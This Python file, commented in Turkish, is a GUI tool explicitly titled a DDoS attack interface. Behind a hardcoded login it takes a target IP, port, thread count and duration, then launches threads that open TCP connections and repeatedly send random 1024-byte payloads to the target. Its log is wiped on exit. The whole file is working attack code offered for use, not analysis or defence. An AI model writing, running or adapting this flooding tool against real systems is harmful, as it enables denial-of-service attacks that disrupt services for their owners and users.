import PySimpleGUI as sg
import socket
import threading
import random
from time import sleep


send_attack = 0 #saldırıların kaç kez gönderildiğini takip eder
username = "a"
password = "1"

sg.theme('Dark Grey 13')

def save_log(text):
    #'a+' modu ekleme+okuma modunda dosyayı açar,metni sonuna ekler.dosya mevcut değilse oluşturur.
    #With işlem tamamlandıktan sonra/bir istisna meydana geldiğinde dosyayı düzgünce kapatır.
    with open("logs.txt", 'a+') as file:
        file.write(text)

def show_error_popup(message):
    layout = [
        [sg.Text(message, size=(20, 3), justification='center')],
        [sg.Button("Tamam", size=(8, 2), key="OK")]
    ]

    window = sg.Window("Hata", layout, finalize=True, keep_on_top=True, disable_close=True, disable_minimize=True)

    while True:
        event, values = window.read()
        if event == sg.WIN_CLOSED or event == "OK":
            break
    window.close()

def login_window():
    layout = [ #liste
        [sg.Text("")],
        [sg.Text("Kullanıcı Adı :", size=(15, 1)), sg.Input(key="Username")], #ınput kullanıcıdan girdi almak için
        [sg.Text("")], 
        [sg.Text("Şifre : ", size=(15, 1)), sg.Input(key="Password", password_char="*")],
        [sg.Text("")],
        [sg.Button("Giriş Yap"), sg.Button("Çıkış Yap")]
    ]


    #pencerenin başlığı sisteme giriş,içerik ise layout listesi
    #pencere küçültülemez ve pencere açık olduğunda diğer pencereler üzerine çıkamaz
    window = sg.Window("Sisteme Giriş", layout, keep_on_top=True, disable_minimize=True,size=(400, 200))

    while True: #giriş penceresi kapatılmadıgı sürece aktif
        #pencerede "Username" giriş alanı varsa, değerine args["Username"] şeklinde ulaşıyoruz
        button, args = window.read() #pencerede meydana gelen olayları bekler
        if button == sg.WIN_CLOSED or button == "Çıkış Yap":
            break
        elif button == "Giriş Yap":
            if args["Username"] == username and args["Password"] == password:
                window.close()
                tools_menu()
                return True
            else: #giriş başarısızsa kullanıcı adı şifreyi temizle
                window["Username"].update("")
                window["Password"].update("")
                show_error_popup("Kullanıcı adı ya da parola yanlış")

def tools_menu():
    global send_attack
    window =None
    layout = [
        [sg.Text("IP"), sg.Input(key="IP")], #saldırı yapılacak hedefin ıp adresi
        [sg.Text("Port"), sg.Input(key="Port")], #Saldırının hangi port üzerinden yapılacağı. Kullanıcı bu alana hedefin açık olan bir portunu girmelidir.
        [sg.Text("Threads"), sg.Input(key="Threads")], #Saldırıda kullanılacak olan eşzamanlı iş parçacığı (thread) sayısı. Bu, aynı anda kaç bağlantı gönderileceğini belirtir.
        [sg.Text("Time"), sg.Input(key="Time")], # Saldırının ne kadar süreyle devam edeceği.
        [sg.Text("Methods:")], 
        [sg.Checkbox("TCP", key="TCP"), sg.InputOptionMenu(("HTTP",), size=(15, 1), key="type_", default_value="HTTP")],
        #ilerleme çubuğu,orientatıon yatay(h),progress_text cubugun üzerindeki metin alanının key değeri
        [sg.ProgressBar(max_value=100, orientation='h', size=(40, 20), key='progress_1'), sg.Text("0%", key="progress_text"), sg.Text(f"Sent: {send_attack}", key="sent")],
        #Logları gösteren bir çıktı alanı
        [sg.Output(size=(100,10), key='log')],
        [sg.Button("Gönder"), sg.Button("Log Temizle", key="clear_log"), sg.Button("Çıkış Yap")]
    ]
    #grab_anywhere=True pencerenin taşınabilmesi için,auto_size_buttons=False butonları otomotik boyutlar
    window = sg.Window('DDOS Saldırı Arayüzü', layout, grab_anywhere=True, font=("Helvetica", 12), auto_size_buttons=False, keep_on_top=True, disable_minimize=True)

    while True:
        button, args = window.read()
        if button == sg.WIN_CLOSED or button == "Çıkış Yap" or button is None:
            with open("logs.txt", "r+") as file: #dosyayı hem okuma hem de yazma modunda ("r+") açar.
                file.truncate(0) #dosyanın boyutu sıfırlandı,içerik silindi.
            break
        elif button == "clear_log":
            with open("logs.txt", "r+") as file:
                file.truncate(0)
        elif button == "Gönder":
            #IP alanı boşsa hata fırlat
            if args["IP"] == "":
                save_log("[ERROR] Lütfen IP adresini Giriniz.\n")
                window["log"].update(open("logs.txt").read())  # log'u güncelle
            #port boşsa hata fırlat
            elif args["Port"] == "":
                save_log("[ERROR] Lütfen Port Adresini Giriniz.\n")
                window["log"].update(open("logs.txt").read())  # log'u güncelle
            #threads boşsa hata fırlat
            elif args["Threads"] == "":
                save_log("[ERROR] Lütfen Threads Sayısını Giriniz.\n")
                window["log"].update(open("logs.txt").read())  # log'u güncelle
            #time boşsa hata fırlat
            elif args["Time"] == "":
                save_log("[ERROR] Lütfen Zamanı Saniye Cinsinden Giriniz. \n")
                window["log"].update(open("logs.txt").read())  # log'u güncelle
            #"Port" değerinin sayısal olup olmadıgı kontrolu
            elif args["Port"].isnumeric() == False:
                save_log("[ERROR] Lütfen Sayısal Bir Değer Giriniz. \n")
                window["log"].update(open("logs.txt").read())  # log'u güncelle
            #threads değerinin sayısal olup olmadıgı kontrolu
            elif args["Threads"].isnumeric() == False:
                save_log("[ERROR] Lütfen Sayısal Bir Değer Giriniz.\n")
                window["log"].update(open("logs.txt").read())  # log'u güncelle
            #time değerinin sayısal olup olmadıgı kontrolu
            elif args["Time"].isnumeric() == False:
                save_log("[ERROR] Lütfen Sayısal Bir Değer Giriniz. \n")
                window["log"].update(open("logs.txt").read())  # log'u güncelle
            else:
                IP = args["IP"]
                Port = args["Port"]
                Threads = args["Threads"]
                Time = args["Time"]
                #TCP SALDIRISI BAŞLAYACAK
                if args["TCP"] == True:
                    for i in range(101):
                        sleep(0.1)
                        window["progress_1"].update_bar(i) #saldırının ilerlemesini gösterir.
                        window["progress_text"].update(str(i) + "%")
                        if i == 100:
                            window["progress_1"].update_bar(0)
                            window["progress_text"].update("0%")
                            save_log(f"[+] Saldırı {IP}:{Port} 'a {Threads} Threads ve {Time} Saniyeyle Gönderildi.\n")
                            window["log"].update(open("logs.txt").read())  # log'u güncelle
                            break
                    #kullanıcının girdiği thread kadar döngü
                    for i in range(int(Threads)):
                        #Her döngüde thread (t) oluşturulur. fonksiyona parametreler gönderilir .
                        t = threading.Thread(target=tcp_http_attack, args=(IP, Port, Time))
                        t.start() #tcp_http_attack fonksiyonunun asenkron bir şekilde çalışmasını sağlar.
                        send_attack += 1
                        window["sent"].update(f"Sent: {send_attack}") 

        window["log"].update(open("logs.txt").read())  # log'u güncelle

#sürekli olarak saldırı verisi göndererek bir TCP bağlantısı oluşturur. 
def tcp_http_attack(IP, Port, Time):
    try:
        
        data = random._urandom(1024) #rastgele 1024 bayt uzunluğunda bir veri
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #socket nesnesi.socket.AF_INET ile IPv4 adreslerini kullanmayı, socket.SOCK_STREAM ile TCP bağlantısını seçmeyi belirtir.
        s.connect((IP,int(Port)))
        s.settimeout(10) 
  
        for i in range(int(Time)):
            # Veriyi sunucuya gönder
            s.sendall(data)
            # Sunucudan gelen cevabı alıp ekrana yazdırma
            response = s.recv(1024)
            print(response.decode('utf-8'))
            save_log(f"bağlantı alındı.")
            
        log_message = f"paket başarıyla adrese gönderildi."
        print(log_message)
        save_log(log_message)
    except socket.timeout:
        print("Bağlantı zaman aşımına uğradı.")

    except Exception as e:
        #save_log(f"[ERROR] Saldırı başarısız oldu: {e} \n")
        pass

    finally: #Bu blok, fonksiyonun her durumda çalıştırılmasını sağlar
        if 's' in locals():
            s.close() #Bağlantı kapatılır.
            

if __name__ == "__main__":
    login_window()
